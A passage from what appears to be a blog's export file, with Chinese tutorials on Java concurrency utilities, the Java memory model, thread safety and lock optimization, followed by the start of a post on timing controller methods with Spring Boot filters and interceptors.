CountDownLatch(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print("run.."); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); System.out.println("end"); executorService.shutdown(); &#125;&#125; 1run..run..run..run..run..run..run..run..run..run..end CyclicBarrier用来控制多个线程互相等待，只有当多个线程都到达时，这些线程才会继续执行。 和 CountdownLatch 相似，都是通过维护计数器来实现的。线程执行 await() 方法之后计数器会减 1，并进行等待，直到计数器为 0，所有调用 await() 方法而在等待的线程才能继续执行。 CyclicBarrier 和 CountdownLatch 的一个区别是，CyclicBarrier 的计数器通过调用 reset() 方法可以循环使用，所以它才叫做循环屏障。 CyclicBarrier 有两个构造函数，其中 parties 指示计数器的初始值，barrierAction 在所有线程都到达屏障的时候会执行一次。 12345678910public CyclicBarrier(int parties, Runnable barrierAction) &#123; if (parties &lt;= 0) throw new IllegalArgumentException(); this.parties = parties; this.count = parties; this.barrierCommand = barrierAction;&#125;public CyclicBarrier(int parties) &#123; this(parties, null);&#125; 1234567891011121314151617181920public class CyclicBarrierExample &#123; public static void main(String[] args) &#123; final int totalThread = 10; CyclicBarrier cyclicBarrier = new CyclicBarrier(totalThread); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalThread; i++) &#123; executorService.execute(() -&gt; &#123; System.out.print("before.."); try &#123; cyclicBarrier.await(); &#125; catch (InterruptedException | BrokenBarrierException e) &#123; e.printStackTrace(); &#125; System.out.print("after.."); &#125;); &#125; executorService.shutdown(); &#125;&#125; 1before..before..before..before..before..before..before..before..before..before..after..after..after..after..after..after..after..after..after..after.. SemaphoreSemaphore 类似于操作系统中的信号量，可以控制对互斥资源的访问线程数。 以下代码模拟了对某个服务的并发请求，每次只能有 3 个客户端同时访问，请求总数为 10。 12345678910111213141516171819202122public class SemaphoreExample &#123; public static void main(String[] args) &#123; final int clientCount = 3; final int totalRequestCount = 10; Semaphore semaphore = new Semaphore(clientCount); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; totalRequestCount; i++) &#123; executorService.execute(()-&gt;&#123; try &#123; semaphore.acquire(); System.out.print(semaphore.availablePermits() + " "); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; finally &#123; semaphore.release(); &#125; &#125;); &#125; executorService.shutdown(); &#125;&#125; 12 1 2 2 2 2 2 1 2 2 八、J.U.C - 其它组件FutureTask在介绍 Callable 时我们知道它可以有返回值，返回值通过 Future 进行封装。FutureTask 实现了 RunnableFuture 接口，该接口继承自 Runnable 和 Future 接口，这使得 FutureTask 既可以当做一个任务执行，也可以有返回值。 1public class FutureTask&lt;V&gt; implements RunnableFuture&lt;V&gt; 1public interface RunnableFuture&lt;V&gt; extends Runnable, Future&lt;V&gt; FutureTask 可用于异步获取执行结果或取消执行任务的场景。当一个计算任务需要执行很长时间，那么就可以用 FutureTask 来封装这个任务，主线程在完成自己的任务之后再去获取结果。 123456789101112131415161718192021222324252627282930public class FutureTaskExample &#123; public static void main(String[] args) throws ExecutionException, InterruptedException &#123; FutureTask&lt;Integer&gt; futureTask = new FutureTask&lt;Integer&gt;(new Callable&lt;Integer&gt;() &#123; @Override public Integer call() throws Exception &#123; int result = 0; for (int i = 0; i &lt; 100; i++) &#123; Thread.sleep(10); result += i; &#125; return result; &#125; &#125;); Thread computeThread = new Thread(futureTask); computeThread.start(); Thread otherThread = new Thread(() -&gt; &#123; System.out.println("other task is running..."); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;); otherThread.start(); System.out.println(futureTask.get()); &#125;&#125; 12other task is running...4950 BlockingQueuejava.util.concurrent.BlockingQueue 接口有以下阻塞队列的实现： FIFO 队列 ：LinkedBlockingQueue、ArrayBlockingQueue（固定长度） 优先级队列 ：PriorityBlockingQueue 提供了阻塞的 take() 和 put() 方法：如果队列为空 take() 将阻塞，直到队列中有内容；如果队列为满 put() 将阻塞，直到队列有空闲位置。 使用 BlockingQueue 实现生产者消费者问题 1234567891011121314151617181920212223242526272829public class ProducerConsumer &#123; private static BlockingQueue&lt;String&gt; queue = new ArrayBlockingQueue&lt;&gt;(5); private static class Producer extends Thread &#123; @Override public void run() &#123; try &#123; queue.put("product"); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print("produce.."); &#125; &#125; private static class Consumer extends Thread &#123; @Override public void run() &#123; try &#123; String product = queue.take(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.print("consume.."); &#125; &#125;&#125; 1234567891011121314public static void main(String[] args) &#123; for (int i = 0; i &lt; 2; i++) &#123; Producer producer = new Producer(); producer.start(); &#125; for (int i = 0; i &lt; 5; i++) &#123; Consumer consumer = new Consumer(); consumer.start(); &#125; for (int i = 0; i &lt; 3; i++) &#123; Producer producer = new Producer(); producer.start(); &#125;&#125; 1produce..produce..consume..consume..produce..consume..produce..consume..produce..consume.. ForkJoin主要用于并行计算中，和 MapReduce 原理类似，都是把大的计算任务拆分成多个小任务并行计算。 12345678910111213141516171819202122232425262728293031public class ForkJoinExample extends RecursiveTask&lt;Integer&gt; &#123; private final int threshold = 5; private int first; private int last; public ForkJoinExample(int first, int last) &#123; this.first = first; this.last = last; &#125; @Override protected Integer compute() &#123; int result = 0; if (last - first &lt;= threshold) &#123; // 任务足够小则直接计算 for (int i = first; i &lt;= last; i++) &#123; result += i; &#125; &#125; else &#123; // 拆分成小任务 int middle = first + (last - first) / 2; ForkJoinExample leftTask = new ForkJoinExample(first, middle); ForkJoinExample rightTask = new ForkJoinExample(middle + 1, last); leftTask.fork(); rightTask.fork(); result = leftTask.join() + rightTask.join(); &#125; return result; &#125;&#125; 123456public static void main(String[] args) throws ExecutionException, InterruptedException &#123; ForkJoinExample example = new ForkJoinExample(1, 10000); ForkJoinPool forkJoinPool = new ForkJoinPool(); Future result = forkJoinPool.submit(example); System.out.println(result.get());&#125; ForkJoin 使用 ForkJoinPool 来启动，它是一个特殊的线程池，线程数量取决于 CPU 核数。 1public class ForkJoinPool extends AbstractExecutorService ForkJoinPool 实现了工作窃取算法来提高 CPU 的利用率。每个线程都维护了一个双端队列，用来存储需要执行的任务。工作窃取算法允许空闲的线程从其它线程的双端队列中窃取一个任务来执行。窃取的任务必须是最晚的任务，避免和队列所属线程发生竞争。例如下图中，Thread2 从 Thread1 的队列中拿出最晚的 Task1 任务，Thread1 会拿出 Task2 来执行，这样就避免发生竞争。但是如果队列中只有一个任务时还是会发生竞争。 九、线程不安全示例如果多个线程对同一个共享数据进行访问而不采取同步操作的话，那么操作的结果是不一致的。 以下代码演示了 1000 个线程同时对 cnt 执行自增操作，操作结束之后它的值有可能小于 1000。 123456789101112public class ThreadUnsafeExample &#123; private int cnt = 0; public void add() &#123; cnt++; &#125; public int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; ThreadUnsafeExample example = new ThreadUnsafeExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 1997 十、Java 内存模型Java 内存模型试图屏蔽各种硬件和操作系统的内存访问差异，以实现让 Java 程序在各种平台下都能达到一致的内存访问效果。 主内存与工作内存处理器上的寄存器的读写的速度比内存快几个数量级，为了解决这种速度矛盾，在它们之间加入了高速缓存。 加入高速缓存带来了一个新的问题：缓存一致性。如果多个缓存共享同一块主内存区域，那么多个缓存的数据可能会不一致，需要一些协议来解决这个问题。 所有的变量都存储在主内存中，每个线程还有自己的工作内存，工作内存存储在高速缓存或者寄存器中，保存了该线程使用的变量的主内存副本拷贝。 线程只能直接操作工作内存中的变量，不同线程之间的变量值传递需要通过主内存来完成。 内存间交互操作Java 内存模型定义了 8 个操作来完成主内存和工作内存的交互操作。 read：把一个变量的值从主内存传输到工作内存中 load：在 read 之后执行，把 read 得到的值放入工作内存的变量副本中 use：把工作内存中一个变量的值传递给执行引擎 assign：把一个从执行引擎接收到的值赋给工作内存的变量 store：把工作内存的一个变量的值传送到主内存中 write：在 store 之后执行，把 store 得到的值放入主内存的变量中 lock：作用于主内存的变量 unlock 内存模型三大特性1. 原子性Java 内存模型保证了 read、load、use、assign、store、write、lock 和 unlock 操作具有原子性，例如对一个 int 类型的变量执行 assign 赋值操作，这个操作就是原子性的。但是 Java 内存模型允许虚拟机将没有被 volatile 修饰的 64 位数据（long，double）的读写操作划分为两次 32 位的操作来进行，即 load、store、read 和 write 操作可以不具备原子性。 有一个错误认识就是，int 等原子性的类型在多线程环境中不会出现线程安全问题。前面的线程不安全示例代码中，cnt 属于 int 类型变量，1000 个线程对它进行自增操作之后，得到的值为 997 而不是 1000。 为了方便讨论，将内存间的交互操作简化为 3 个：load、assign、store。 下图演示了两个线程同时对 cnt 进行操作，load、assign、store 这一系列操作整体上看不具备原子性，那么在 T1 修改 cnt 并且还没有将修改后的值写入主内存，T2 依然可以读入旧值。可以看出，这两个线程虽然执行了两次自增运算，但是主内存中 cnt 的值最后为 1 而不是 2。因此对 int 类型读写操作满足原子性只是说明 load、assign、store 这些单个操作具备原子性。 AtomicInteger 能保证多个线程修改的原子性。 使用 AtomicInteger 重写之前线程不安全的代码之后得到以下线程安全实现： 1234567891011public class AtomicExample &#123; private AtomicInteger cnt = new AtomicInteger(); public void add() &#123; cnt.incrementAndGet(); &#125; public int get() &#123; return cnt.get(); &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicExample example = new AtomicExample(); // 只修改这条语句 final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 除了使用原子类之外，也可以使用 synchronized 互斥锁来保证操作的原子性。它对应的内存间交互操作为：lock 和 unlock，在虚拟机实现上对应的字节码指令为 monitorenter 和 monitorexit。 1234567891011public class AtomicSynchronizedExample &#123; private int cnt = 0; public synchronized void add() &#123; cnt++; &#125; public synchronized int get() &#123; return cnt; &#125;&#125; 123456789101112131415public static void main(String[] args) throws InterruptedException &#123; final int threadSize = 1000; AtomicSynchronizedExample example = new AtomicSynchronizedExample(); final CountDownLatch countDownLatch = new CountDownLatch(threadSize); ExecutorService executorService = Executors.newCachedThreadPool(); for (int i = 0; i &lt; threadSize; i++) &#123; executorService.execute(() -&gt; &#123; example.add(); countDownLatch.countDown(); &#125;); &#125; countDownLatch.await(); executorService.shutdown(); System.out.println(example.get());&#125; 11000 2. 可见性可见性指当一个线程修改了共享变量的值，其它线程能够立即得知这个修改。Java 内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量值来实现可见性的。 主要有三种实现可见性的方式： volatile synchronized，对一个变量执行 unlock 操作之前，必须把变量值同步回主内存。 final，被 final 关键字修饰的字段在构造器中一旦初始化完成，并且没有发生 this 逃逸（其它线程通过 this 引用访问到初始化了一半的对象），那么其它线程就能看见 final 字段的值。 对前面的线程不安全示例中的 cnt 变量使用 volatile 修饰，不能解决线程不安全问题，因为 volatile 并不能保证操作的原子性。 3. 有序性有序性是指：在本线程内观察，所有操作都是有序的。在一个线程观察另一个线程，所有操作都是无序的，无序是因为发生了指令重排序。在 Java 内存模型中，允许编译器和处理器对指令进行重排序，重排序过程不会影响到单线程程序的执行，却会影响到多线程并发执行的正确性。 volatile 关键字通过添加内存屏障的方式来禁止指令重排，即重排序时不能把后面的指令放到内存屏障之前。 也可以通过 synchronized 来保证有序性，它保证每个时刻只有一个线程执行同步代码，相当于是让线程顺序执行同步代码。 先行发生原则上面提到了可以用 volatile 和 synchronized 来保证有序性。除此之外，JVM 还规定了先行发生原则，让一个操作无需控制就能先于另一个操作完成。 1. 单一线程原则 Single Thread rule 在一个线程内，在程序前面的操作先行发生于后面的操作。 2. 管程锁定规则 Monitor Lock Rule 一个 unlock 操作先行发生于后面对同一个锁的 lock 操作。 3. volatile 变量规则 Volatile Variable Rule 对一个 volatile 变量的写操作先行发生于后面对这个变量的读操作。 4. 线程启动规则 Thread Start Rule Thread 对象的 start() 方法调用先行发生于此线程的每一个动作。 5. 线程加入规则 Thread Join Rule Thread 对象的结束先行发生于 join() 方法返回。 6. 线程中断规则 Thread Interruption Rule 对线程 interrupt() 方法的调用先行发生于被中断线程的代码检测到中断事件的发生，可以通过 interrupted() 方法检测到是否有中断发生。 7. 对象终结规则 Finalizer Rule 一个对象的初始化完成（构造函数执行结束）先行发生于它的 finalize() 方法的开始。 8. 传递性 Transitivity 如果操作 A 先行发生于操作 B，操作 B 先行发生于操作 C，那么操作 A 先行发生于操作 C。 十一、线程安全多个线程不管以何种方式访问某个类，并且在主调代码中不需要进行同步，都能表现正确的行为。 线程安全有以下几种实现方式： 不可变不可变（Immutable）的对象一定是线程安全的，不需要再采取任何的线程安全保障措施。只要一个不可变的对象被正确地构建出来，永远也不会看到它在多个线程之中处于不一致的状态。多线程环境下，应当尽量使对象成为不可变，来满足线程安全。 不可变的类型： final 关键字修饰的基本数据类型 String 枚举类型 Number 部分子类，如 Long 和 Double 等数值包装类型，BigInteger 和 BigDecimal 等大数据类型。但同为 Number 的原子类 AtomicInteger 和 AtomicLong 则是可变的。 对于集合类型，可以使用 Collections.unmodifiableXXX() 方法来获取一个不可变的集合。 1234567public class ImmutableExample &#123; public static void main(String[] args) &#123; Map&lt;String, Integer&gt; map = new HashMap&lt;&gt;(); Map&lt;String, Integer&gt; unmodifiableMap = Collections.unmodifiableMap(map); unmodifiableMap.put("a", 1); &#125;&#125; 123Exception in thread "main" java.lang.UnsupportedOperationException at java.util.Collections$UnmodifiableMap.put(Collections.java:1457) at ImmutableExample.main(ImmutableExample.java:9) Collections.unmodifiableXXX() 先对原始的集合进行拷贝，需要对集合进行修改的方法都直接抛出异常。 123public V put(K key, V value) &#123; throw new UnsupportedOperationException();&#125; 互斥同步synchronized 和 ReentrantLock。 非阻塞同步互斥同步最主要的问题就是线程阻塞和唤醒所带来的性能问题，因此这种同步也称为阻塞同步。 互斥同步属于一种悲观的并发策略，总是认为只要不去做正确的同步措施，那就肯定会出现问题。无论共享数据是否真的会出现竞争，它都要进行加锁（这里讨论的是概念模型，实际上虚拟机会优化掉很大一部分不必要的加锁）、用户态核心态转换、维护锁计数器和检查是否有被阻塞的线程需要唤醒等操作。 1. CAS随着硬件指令集的发展，我们可以使用基于冲突检测的乐观并发策略：先进行操作，如果没有其它线程争用共享数据，那操作就成功了，否则采取补偿措施（不断地重试，直到成功为止）。这种乐观的并发策略的许多实现都不需要将线程阻塞，因此这种同步操作称为非阻塞同步。 乐观锁需要操作和冲突检测这两个步骤具备原子性，这里就不能再使用互斥同步来保证了，只能靠硬件来完成。硬件支持的原子性操作最典型的是：比较并交换（Compare-and-Swap，CAS）。CAS 指令需要有 3 个操作数，分别是内存地址 V、旧的预期值 A 和新值 B。当执行操作时，只有当 V 的值等于 A，才将 V 的值更新为 B。 2. AtomicIntegerJ.U.C 包里面的整数原子类 AtomicInteger 的方法调用了 Unsafe 类的 CAS 操作。 以下代码使用了 AtomicInteger 执行了自增的操作。 12345private AtomicInteger cnt = new AtomicInteger();public void add() &#123; cnt.incrementAndGet();&#125; 以下代码是 incrementAndGet() 的源码，它调用了 Unsafe 的 getAndAddInt() 。 123public final int incrementAndGet() &#123; return unsafe.getAndAddInt(this, valueOffset, 1) + 1;&#125; 以下代码是 getAndAddInt() 源码，var1 指示对象内存地址，var2 指示该字段相对对象内存地址的偏移，var4 指示操作需要加的数值，这里为 1。通过 getIntVolatile(var1, var2) 得到旧的预期值，通过调用 compareAndSwapInt() 来进行 CAS 比较，如果该字段内存地址中的值等于 var5，那么就更新内存地址为 var1+var2 的变量为 var5+var4。 可以看到 getAndAddInt() 在一个循环中进行，发生冲突的做法是不断的进行重试。 12345678public final int getAndAddInt(Object var1, long var2, int var4) &#123; int var5; do &#123; var5 = this.getIntVolatile(var1, var2); &#125; while(!this.compareAndSwapInt(var1, var2, var5, var5 + var4)); return var5;&#125; 3. ABA如果一个变量初次读取的时候是 A 值，它的值被改成了 B，后来又被改回为 A，那 CAS 操作就会误认为它从来没有被改变过。 J.U.C 包提供了一个带有标记的原子引用类 AtomicStampedReference 来解决这个问题，它可以通过控制变量值的版本来保证 CAS 的正确性。大部分情况下 ABA 问题不会影响程序并发的正确性，如果需要解决 ABA 问题，改用传统的互斥同步可能会比原子类更高效。 无同步方案要保证线程安全，并不是一定就要进行同步。如果一个方法本来就不涉及共享数据，那它自然就无须任何同步措施去保证正确性。 1. 栈封闭多个线程访问同一个方法的局部变量时，不会出现线程安全问题，因为局部变量存储在虚拟机栈中，属于线程私有的。 123456789public class StackClosedExample &#123; public void add100() &#123; int cnt = 0; for (int i = 0; i &lt; 100; i++) &#123; cnt++; &#125; System.out.println(cnt); &#125;&#125; 1234567public static void main(String[] args) &#123; StackClosedExample example = new StackClosedExample(); ExecutorService executorService = Executors.newCachedThreadPool(); executorService.execute(() -&gt; example.add100()); executorService.execute(() -&gt; example.add100()); executorService.shutdown();&#125; 12100100 2. 线程本地存储（Thread Local Storage）如果一段代码中所需要的数据必须与其他代码共享，那就看看这些共享数据的代码是否能保证在同一个线程中执行。如果能保证，我们就可以把共享数据的可见范围限制在同一个线程之内，这样，无须同步也能保证线程之间不出现数据争用的问题。 符合这种特点的应用并不少见，大部分使用消费队列的架构模式（如“生产者-消费者”模式）都会将产品的消费过程尽量在一个线程中消费完。其中最重要的一个应用实例就是经典 Web 交互模型中的“一个请求对应一个服务器线程”（Thread-per-Request）的处理方式，这种处理方式的广泛应用使得很多 Web 服务端应用都可以使用线程本地存储来解决线程安全问题。 可以使用 java.lang.ThreadLocal 类来实现线程本地存储功能。 对于以下代码，thread1 中设置 threadLocal 为 1，而 thread2 设置 threadLocal 为 2。过了一段时间之后，thread1 读取 threadLocal 依然是 1，不受 thread2 的影响。 123456789101112131415161718192021public class ThreadLocalExample &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal.set(1); try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(threadLocal.get()); threadLocal.remove(); &#125;); Thread thread2 = new Thread(() -&gt; &#123; threadLocal.set(2); threadLocal.remove(); &#125;); thread1.start(); thread2.start(); &#125;&#125; 11 为了理解 ThreadLocal，先看以下代码： 12345678910111213141516public class ThreadLocalExample1 &#123; public static void main(String[] args) &#123; ThreadLocal threadLocal1 = new ThreadLocal(); ThreadLocal threadLocal2 = new ThreadLocal(); Thread thread1 = new Thread(() -&gt; &#123; threadLocal1.set(1); threadLocal2.set(1); &#125;); Thread thread2 = new Thread(() -&gt; &#123; threadLocal1.set(2); threadLocal2.set(2); &#125;); thread1.start(); thread2.start(); &#125;&#125; 它所对应的底层结构图为： 每个 Thread 都有一个 ThreadLocal.ThreadLocalMap 对象。 123/* ThreadLocal values pertaining to this thread. This map is maintained * by the ThreadLocal class. */ThreadLocal.ThreadLocalMap threadLocals = null; 当调用一个 ThreadLocal 的 set(T value) 方法时，先得到当前线程的 ThreadLocalMap 对象，然后将 ThreadLocal-&gt;value 键值对插入到该 Map 中。 12345678public void set(T value) &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value);&#125; get() 方法类似。 12345678910111213public T get() &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) &#123; ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) &#123; @SuppressWarnings("unchecked") T result = (T)e.value; return result; &#125; &#125; return setInitialValue();&#125; ThreadLocal 从理论上讲并不是用来解决多线程并发问题的，因为根本不存在多线程竞争。 在一些场景 (尤其是使用线程池) 下，由于 ThreadLocal.ThreadLocalMap 的底层数据结构导致 ThreadLocal 有内存泄漏的情况，应该尽可能在每次使用 ThreadLocal 后手动调用 remove()，以避免出现 ThreadLocal 经典的内存泄漏甚至是造成自身业务混乱的风险。 3. 可重入代码（Reentrant Code）这种代码也叫做纯代码（Pure Code），可以在代码执行的任何时刻中断它，转而去执行另外一段代码（包括递归调用它本身），而在控制权返回后，原来的程序不会出现任何错误。 可重入代码有一些共同的特征，例如不依赖存储在堆上的数据和公用的系统资源、用到的状态量都由参数中传入、不调用非可重入的方法等。 十二、锁优化这里的锁优化主要是指 JVM 对 synchronized 的优化。 自旋锁互斥同步进入阻塞状态的开销都很大，应该尽量避免。在许多应用中，共享数据的锁定状态只会持续很短的一段时间。自旋锁的思想是让一个线程在请求一个共享数据的锁时执行忙循环（自旋）一段时间，如果在这段时间内能获得锁，就可以避免进入阻塞状态。 自旋锁虽然能避免进入阻塞状态从而减少开销，但是它需要进行忙循环操作占用 CPU 时间，它只适用于共享数据的锁定状态很短的场景。 在 JDK 1.6 中引入了自适应的自旋锁。自适应意味着自旋的次数不再固定了，而是由前一次在同一个锁上的自旋次数及锁的拥有者的状态来决定。 锁消除锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。 锁消除主要是通过逃逸分析来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们的锁进行消除。 对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁： 123public static String concatString(String s1, String s2, String s3) &#123; return s1 + s2 + s3;&#125; String 是一个不可变的类，编译器会对 String 的拼接自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作： 1234567public static String concatString(String s1, String s2, String s3) &#123; StringBuffer sb = new StringBuffer(); sb.append(s1); sb.append(s2); sb.append(s3); return sb.toString();&#125; 每个 append() 方法中都有一个同步块。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是说，sb 的所有引用永远不会逃逸到 concatString() 方法之外，其他线程无法访问到它，因此可以进行消除。 锁粗化如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。 上一节的示例代码中连续的 append() 方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。 轻量级锁JDK 1.6 引入了偏向锁和轻量级锁，从而让锁拥有了四个状态：无锁状态（unlocked）、偏向锁状态（biasble）、轻量级锁状态（lightweight locked）和重量级锁状态（inflated）。 以下是 HotSpot 虚拟机对象头的内存布局，这些数据被称为 Mark Word。其中 tag bits 对应了五个状态，这些状态在右侧的 state 表格中给出。除了 marked for gc 状态，其它四个状态已经在前面介绍过了。 下图左侧是一个线程的虚拟机栈，其中有一部分称为 Lock Record 的区域，这是在轻量级锁运行过程创建的，用于存放锁对象的 Mark Word。而右侧就是一个锁对象，包含了 Mark Word 和其它信息。 轻量级锁是相对于传统的重量级锁而言，它使用 CAS 操作来避免重量级锁使用互斥量的开销。对于绝大部分的锁，在整个同步周期内都是不存在竞争的，因此也就不需要都使用互斥量进行同步，可以先采用 CAS 操作进行同步，如果 CAS 失败了再改用互斥量进行同步。 当尝试获取一个锁对象时，如果锁对象标记为 0 01，说明锁对象的锁未锁定（unlocked）状态。此时虚拟机在当前线程的虚拟机栈中创建 Lock Record，然后使用 CAS 操作将对象的 Mark Word 更新为 Lock Record 指针。如果 CAS 操作成功了，那么线程就获取了该对象上的锁，并且对象的 Mark Word 的锁标记变为 00，表示该对象处于轻量级锁状态。 如果 CAS 操作失败了，虚拟机首先会检查对象的 Mark Word 是否指向当前线程的虚拟机栈，如果是的话说明当前线程已经拥有了这个锁对象，那就可以直接进入同步块继续执行，否则说明这个锁对象已经被其他线程线程抢占了。如果有两条以上的线程争用同一个锁，那轻量级锁就不再有效，要膨胀为重量级锁。 偏向锁偏向锁的思想是偏向于让第一个获取锁对象的线程，这个线程在之后获取该锁就不再需要进行同步操作，甚至连 CAS 操作也不再需要。 当锁对象第一次被线程获得的时候，进入偏向状态，标记为 1 01。同时使用 CAS 操作将线程 ID 记录到 Mark Word 中，如果 CAS 操作成功，这个线程以后每次进入这个锁相关的同步块就不需要再进行任何同步操作。 当有另外一个线程去尝试获取这个锁对象时，偏向状态就宣告结束，此时撤销偏向（Revoke Bias）后恢复到未锁定状态或者轻量级锁状态。 十三、多线程开发良好的实践 给线程起个有意义的名字，这样可以方便找 Bug。 缩小同步范围，从而减少锁争用。例如对于 synchronized，应该尽量使用同步块而不是同步方法。 多用同步工具少用 wait() 和 notify()。首先，CountDownLatch, CyclicBarrier, Semaphore 和 Exchanger 这些同步类简化了编码操作，而用 wait() 和 notify() 很难实现复杂控制流；其次，这些同步类是由最好的企业编写和维护，在后续的 JDK 中还会不断优化和完善。 使用 BlockingQueue 实现生产者消费者问题。 多用并发集合少用同步集合，例如应该使用 ConcurrentHashMap 而不是 Hashtable。 使用本地变量和不可变类来保证线程安全。 使用线程池而不是直接创建线程，这是因为创建线程代价很高，线程池可以有效地利用有限的线程来启动任务。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Springboot中使用过滤器和拦截器]]></title>
    <url>%2F2019%2F01%2F16%2FSpringboot%E4%B8%AD%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8%E5%92%8C%E6%8B%A6%E6%88%AA%E5%99%A8%2F</url>
    <content type="text"><![CDATA[过滤器（Filter）和拦截器（Interceptor）是Web项目中常用的两个功能，本文将简单介绍在Spring Boot中使用过滤器和拦截器来计算Controller中方法的执行时长，并且简单对比两者的区别。 现有如下Controller： 123456789@RestController@RequestMapping(&quot;user&quot;)public class UserController &#123; @GetMapping(&quot;/&#123;id:\\d+&#125;&quot;) public void get(@PathVariable String id) &#123; System.out.println(id); &#125;&#125; 下面通过配置过滤器和拦截器来实现对get方法执行时间计算的功能。 过滤器定义一个TimeFilter类，实现javax.servlet.Filter： 1234567891011121314151617181920public class TimeFilter implements Filter&#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; System.out.println(&quot;过滤器初始化&quot;); &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; System.out.println(&quot;开始执行过滤器&quot;); Long start = new Date().getTime(); filterChain.doFilter(servletRequest, servletResponse); System.out.println(&quot;【过滤器】耗时 &quot; + (new Date().getTime() - start)); System.out.println(&quot;结束执行过滤器&quot;); &#125; @Override public void destroy() &#123; System.out.println(&quot;过滤器销毁&quot;); &#125;&#125; TimeFilter重写了Filter的三个方法，方法名称已经很直白的描述了其作用，这里不再赘述。 要使该过滤器在Spring Boot中生效，还需要一些配置。这里主要有两种配置方式。 配置方式一可通过在TimeFilter上加上如下注解： 12345@Component@WebFilter(urlPatterns = &#123;&quot;/*&quot;&#125;)public class TimeFilter implements Filter &#123; ...&#125; @Component注解让TimeFilter成为Spring上下文中的一个Bean，@WebFilter注解的urlPatterns属性配置了哪些请求可以进入该过滤器，/*表示所有请求。 启动项目时可以看到控制台输出了过滤器初始化，启动后访问http://localhost:8080/user/1，控制台输出如下： 1234开始执行过滤器1【过滤器】耗时 31结束执行过滤器 配置方式二除了在过滤器类上加注解外，我们也可以通过FilterRegistrationBean来注册过滤器。 定义一个WebConfig类，加上@Configuration注解表明其为配置类，然后通过FilterRegistrationBean来注册过滤器: 123456789101112131415@Configurationpublic class WebConfig &#123; @Bean public FilterRegistrationBean timeFilter() &#123; FilterRegistrationBean filterRegistrationBean = new FilterRegistrationBean(); TimeFilter timeFilter = new TimeFilter(); filterRegistrationBean.setFilter(timeFilter); List&lt;String&gt; urlList = new ArrayList&lt;&gt;(); urlList.add(&quot;/*&quot;); filterRegistrationBean.setUrlPatterns(urlList); return filterRegistrationBean; &#125;&#125; FilterRegistrationBean除了注册过滤器TimeFilter外还通过setUrlPatterns方法配置了URL匹配规则。重启项目访问http://localhost:8080/user/1，我们可以看到和上面一样的效果。 通过过滤器我们只可以获取到servletRequest对象，所以并不能获取到方法的名称，所属类，参数等额外的信息。 拦截器定义一个TimeInterceptor类，实现org.springframework.web.servlet.HandlerInterceptor接口: 12345678910111213141516171819202122232425public class TimeInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o) throws Exception &#123; System.out.println(&quot;处理拦截之前&quot;); httpServletRequest.setAttribute(&quot;startTime&quot;, new Date().getTime()); System.out.println(((HandlerMethod) o).getBean().getClass().getName()); System.out.println(((HandlerMethod) o).getMethod().getName()); return true; &#125; @Override public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception &#123; System.out.println(&quot;开始处理拦截&quot;); Long start = (Long) httpServletRequest.getAttribute(&quot;startTime&quot;); System.out.println(&quot;【拦截器】耗时 &quot; + (new Date().getTime() - start)); &#125; @Override public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception &#123; System.out.println(&quot;处理拦截之后&quot;); Long start = (Long) httpServletRequest.getAttribute(&quot;startTime&quot;); System.out.println(&quot;【拦截器】耗时 &quot; + (new Date().getTime() - start)); System.out.println(&quot;异常信息 &quot; + e); 